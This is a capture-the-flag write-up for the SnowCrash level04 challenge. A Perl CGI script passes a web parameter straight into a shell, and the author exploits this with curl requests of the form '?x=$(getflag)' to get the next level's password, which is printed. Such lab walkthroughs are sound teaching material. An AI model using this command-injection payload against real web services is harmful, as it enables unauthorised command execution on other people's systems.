## level04:

 

I found a Perl file, which is a high-level programming language. I executed the file, and the output is:

```bash
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html

level04@SnowCrash:~$
```

I used the `cat` command on this file:

```bash
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
```

Let's break down the Perl code:

```bash
#localhost:4747 This is a comment, often used for documentation or notes that mean the port the used is 4747
```

```bash
use CGI qw{param}; # Importing CGI module is used to handle web-based input and output
```

```bash
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
#Define a subroutine x: This is a subroutine named x. 
#It takes one argument ($_[0]), assigns it to the variable $y, 
#and then executes a shell command echo $y.
#The backticks ` are used to execute the command in the shell. 
#2>&1 redirects both standard error and standard output to the same place. 
#The result is then printed.
```

```bash
x(param("x"));

#This line calls the x subroutine with the value of the CGI parameter named "x"
```

I know that the code can execute commands as root, like this: 

```c
level04@SnowCrash:~$ netstat -tuln | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
level04@SnowCrash:~$
```

```bash
evel04@SnowCrash:~$ curl '0.0.0.0:4747/?x=$(ls)'
[level04.pl](http://level04.pl/)
level04@SnowCrash:~$
```

Now I am going to execute the `getflag` command.

```bash
level04@SnowCrash:~$ curl '0.0.0.0:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```

The password for the next level is:`ne2searoevaevoem4ov4ar8ap`

```bash
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$
```